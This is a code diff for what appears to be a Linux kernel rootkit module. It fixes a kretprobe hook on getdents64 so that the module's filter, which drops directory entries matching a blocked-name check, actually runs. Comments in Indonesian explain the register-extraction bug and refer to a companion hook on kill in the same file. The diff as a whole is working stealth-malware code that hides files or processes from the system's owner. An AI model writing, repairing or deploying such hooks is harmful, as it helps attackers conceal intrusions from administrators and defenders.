@@ -304,7 +304,19 @@ static bool blocked(const char *n, unsigned int max)
 
 static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	((struct gd_save *)ri->data)->buf = (char __user *)regs->si;
+	/*
+	 * PERBAIKAN BUG EKSTRAKSI (bug identik ditemukan di backend modern,
+	 * terbukti lewat uji 5.11): __x64_sys_getdents64 adalah WRAPPER yang
+	 * menerima const struct pt_regs * — argumen syscall asli ada di DALAM
+	 * struct itu (regs->di = pt_regs* -> ->si = buffer user).
+	 * Kode lama memakai regs->si LANGSUNG = register sampah ->
+	 * copy_from_user EFAULT diam-diam -> filter TIDAK PERNAH jalan.
+	 * Pola sama dengan hook kill di file ini (sr = regs->di) yang LULUS uji.
+	 */
+	struct pt_regs *sregs = (struct pt_regs *)regs->di;
+
+	((struct gd_save *)ri->data)->buf =
+		sregs ? (char __user *)sregs->si : NULL;
 	return 0;
 }
 
@@ -315,7 +327,7 @@ static int gd_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 	unsigned long pos = 0, out = 0;
 	char *kb;
 
-	if (ret <= 0 || ret > (1L << 24))
+	if (!s->buf || ret <= 0 || ret > (1L << 24))   /* buf NULL = ekstraksi gagal */
 		return 0;
 	kb = kmalloc((size_t)ret, GFP_KERNEL);
 	if (!kb)
